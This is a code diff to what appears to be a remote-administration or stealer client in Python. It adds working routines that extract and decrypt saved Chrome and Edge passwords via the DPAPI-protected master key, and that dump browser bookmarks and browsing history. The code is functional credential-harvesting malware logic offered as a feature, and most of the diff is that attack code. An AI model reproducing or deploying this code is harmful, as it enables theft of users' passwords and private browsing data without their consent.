@@ -1,6 +1,7 @@
 # coding=utf-8
 import base64
 import ctypes
+import datetime
 import inspect
 import json
 import locale
@@ -434,7 +435,58 @@ class ClientUtil:
     @staticmethod
     def chrome_password():
         try:
-            return get_password()
+            master_key = get_chrome_master_key()
+            db = os.path.expanduser('~') + os.sep + r'AppData\Local\Google\Chrome\User Data\Default\Login Data'
+            return get_password(master_key, db)
+        except Exception as exception:
+            return '[-] Error: ' + str(exception)
+
+    @staticmethod
+    def edge_password():
+        try:
+            master_key = get_edge_master_key()
+            db = os.path.expanduser('~') + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
+            return get_password(master_key, db)
+        except Exception as exception:
+            return '[-] Error: ' + str(exception)
+
+    @staticmethod
+    def chrome_bookmark():
+        try:
+            file = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Default\Bookmarks'
+            if not os.path.isfile(file):
+                return '[-] No bookmark found'
+            return get_bookmark(file)
+        except Exception as exception:
+            return '[-] Error: ' + str(exception)
+
+    @staticmethod
+    def edge_bookmark():
+        try:
+            file = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks'
+            if not os.path.isfile(file):
+                return '[-] No bookmark found'
+            return get_bookmark(file)
+        except Exception as exception:
+            return '[-] Error: ' + str(exception)
+
+    @staticmethod
+    def chrome_history():
+        try:
+            db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Default\History'
+            if not os.path.isfile(db):
+                return '[-] No history found'
+            return get_history(db)
+        except Exception as exception:
+            return '[-] Error: ' + str(exception)
+
+    @staticmethod
+    def edge_history():
+        try:
+            db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\History'
+            if not os.path.isfile(db):
+                return '[-] No history found'
+            return get_history(db)
         except Exception as exception:
             return '[-] Error: ' + str(exception)
 
@@ -617,10 +669,18 @@ def get_software_list(hive, flag):
     return software_list
 
 
-def get_master_key():
+def get_chrome_master_key():
     file = os.path.expanduser('~') + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State'
     with open(file, 'r') as f:
         local_state = json.loads(f.read().replace('\\', '\\\\'))
+        master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
+        return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+
+
+def get_edge_master_key():
+    file = os.path.expanduser('~') + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State'
+    with open(file, 'r', encoding='utf-8') as f:
+        local_state = json.loads(f.read())
         master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
         return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
 
@@ -637,9 +697,7 @@ def decrypt_password(buf, master_key):
         return None
 
 
-def get_password():
-    master_key = get_master_key()
-    db = os.path.expanduser('~') + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
+def get_password(master_key, db):
     shutil.copy2(db, 'vault.db')
     conn = sqlite3.connect('vault.db')
     cursor = conn.cursor()
@@ -655,6 +713,36 @@ def get_password():
     conn.close()
     if os.path.isfile('vault.db'):
         os.remove('vault.db')
+    return result
+
+
+def convert_date(ft):
+    utc = datetime.datetime.fromtimestamp(((10 * int(ft)) - 116444736000000000) / 10000000)
+    return utc.strftime('%Y-%m-%d %H:%M:%S')
+
+
+def get_bookmark(file):
+    with open(file, encoding='utf-8') as f:
+        data = json.load(f)
+        bookmarks = data['roots']['bookmark_bar']['children']
+        result = ''
+        for i in range(len(bookmarks)):
+            result += f'Name: {bookmarks[i]["name"]}\nURL: {bookmarks[i]["url"]}\nAdded on: {convert_date(bookmarks[i]["date_added"])}\n'
+        return result
+
+
+def get_history(db):
+    shutil.copy2(db, 'history.db')
+    conn = sqlite3.connect('history.db')
+    cursor = conn.cursor()
+    cursor.execute('SELECT url FROM urls')
+    result = ''
+    for url in cursor.fetchall():
+        result += url[0] + os.linesep
+    cursor.close()
+    conn.close()
+    if os.path.isfile('history.db'):
+        os.remove('history.db')
     return result
 
 
